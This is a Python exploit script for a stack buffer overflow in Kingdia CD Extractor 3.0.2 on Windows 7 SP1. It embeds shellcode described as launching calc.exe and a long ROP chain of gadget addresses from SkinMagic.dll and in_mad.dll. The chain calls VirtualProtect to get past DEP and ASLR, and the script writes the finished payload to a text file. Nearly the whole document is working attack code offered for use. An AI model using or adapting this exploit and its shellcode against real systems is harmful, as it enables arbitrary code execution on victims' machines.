# Title: Kingdia CD Extractor 3.0.2 - CVE N\A
# Target binary: 'Kingdia CD Extractor.exe'
# Target system: Windows 7 SP1
# Stack Overflow + ROP Chain --> SkinMagic.dll, in_mad.dll
# ExploitDB page: https://www.exploit-db.com/exploits/50470

# Note that this exploit is different than the one on ExploitDB.
# Although the ExploitDB code is an SEH overwrite and this
# is just a basic EIP overwrite, I wanted to implemented 
# a ROP Chain to bypass Data Execution Prevention and 
# Address Space Layout Randomization. This was possible because 
# the software comes with two modules that lack both ASLR and Rebasing: 
# SkinMagic.dll and in_mad.dll.

from struct import pack

shellcode =  b""
shellcode += b"\xbe\xb0\xe7\xa7\xc5\xdb\xd4\xd9\x74\x24\xf4\x5a\x33"
shellcode += b"\xc9\xb1\x31\x31\x72\x13\x83\xea\xfc\x03\x72\xbf\x05"
shellcode += b"\x52\x39\x57\x4b\x9d\xc2\xa7\x2c\x17\x27\x96\x6c\x43"
shellcode += b"\x23\x88\x5c\x07\x61\x24\x16\x45\x92\xbf\x5a\x42\x95"
shellcode += b"\x08\xd0\xb4\x98\x89\x49\x84\xbb\x09\x90\xd9\x1b\x30"
shellcode += b"\x5b\x2c\x5d\x75\x86\xdd\x0f\x2e\xcc\x70\xa0\x5b\x98"
shellcode += b"\x48\x4b\x17\x0c\xc9\xa8\xef\x2f\xf8\x7e\x64\x76\xda"
shellcode += b"\x81\xa9\x02\x53\x9a\xae\x2f\x2d\x11\x04\xdb\xac\xf3"
shellcode += b"\x55\x24\x02\x3a\x5a\xd7\x5a\x7a\x5c\x08\x29\x72\x9f"
shellcode += b"\xb5\x2a\x41\xe2\x61\xbe\x52\x44\xe1\x18\xbf\x75\x26"
shellcode += b"\xfe\x34\x79\x83\x74\x12\x9d\x12\x58\x28\x99\x9f\x5f"
shellcode += b"\xff\x28\xdb\x7b\xdb\x71\xbf\xe2\x7a\xdf\x6e\x1a\x9c"
shellcode += b"\x80\xcf\xbe\xd6\x2c\x1b\xb3\xb4\x3a\xda\x41\xc3\x08"
shellcode += b"\xdc\x59\xcc\x3c\xb5\x68\x47\xd3\xc2\x74\x82\x90\x3d"
shellcode += b"\x3f\x8f\xb0\xd5\xe6\x45\x81\xbb\x18\xb0\xc5\xc5\x9a"
shellcode += b"\x31\xb5\x31\x82\x33\xb0\x7e\x04\xaf\xc8\xef\xe1\xcf"
shellcode += b"\x7f\x0f\x20\xac\x1e\x83\xa8\x1d\x85\x23\x4a\x62"

# shellcode --> calc.exe
# bad characters: \x00\x0a\x0d

'''
ROP CHAIN:

 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + PUSHAD # RETN
 + place ptr to "jmp esp" on stack, below PUSHAD
 
'''

def generate_rop():

    gadgets = [

        # padding
        0x1003A015, # RETN --> SkinMagic.dll
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        0x1003A015,
        

        # set edx --> 0x40
        0x1003a014, # pop ecx # retn
        0x10021AB6, # random address in skinmagic.dll --> ECX HAS TO POINT TO A VALID MEMORY ADDRESS. OTHERWISE THE SECOND INSTRUCTION OF THE NEXT GADGET WILL FAIL
        0x1003176a, # XOR EDX,EDX # CMP EAX,DWORD PTR DS:[ECX+8] # SETG DL # MOV EAX,EDX # RETN
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,
        0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
        0x41414141,
        0x41414141,


        # set ebx --> dwsize
        0x1002e38c, # pop eax # retn
        0xFFFFFCFF, # 0x301 to negate
        0x1001f629, # NEG EAX # RETN
        0x601ccfd1, # XCHG EAX,EBX # RETN


        # set ecx --> lpOldProtect
        0x1003a568, # pop ecx # retn
        0x1004982b, # writable location


        # set edi --> retn
        0x601de1c9, # pop edi # retn
        0x1003A015, # retn


        # set ebp --> pop ebp
        0x10028019, # pop ebp # retn
        0x10028019,


        # set esi --> ptr to JMP [EAX]
        0x1002e38c, # pop eax # retn
        0x1003b268, # ptr &VirtualProtect
        0x100369a1, # MOV EAX,DWORD PTR DS:[EAX] # RETN
        0x601d108f, # XCHG EAX,ESI # RETN

        # set eax --> &VirtualProtect
        0x1002e38c, # pop eax # retn
        0x1003b268, # ptr &VirtualProtect

        # pushad + jmp esp
        0x601c88c0, # pushad # retn
        0x601C9D6B, # jmp esp


        ]

    chain = []
    for gadget in gadgets:
        chain.append(pack("<I", gadget))
    return "".join(chain)


def exploit():

    rop_chain = generate_rop()
    
    payload = "A"*268
    payload += pack("<I", 0x1003A015)	# RETN --> SkinMagic.dll 
    payload += rop_chain
    payload += "\x90"*8
    payload += shellcode

    f = open("sendme.txt", "w")
    f.write(payload)
    f.close()

def main():
    exploit()

if __name__ == "__main__":
    main()
    
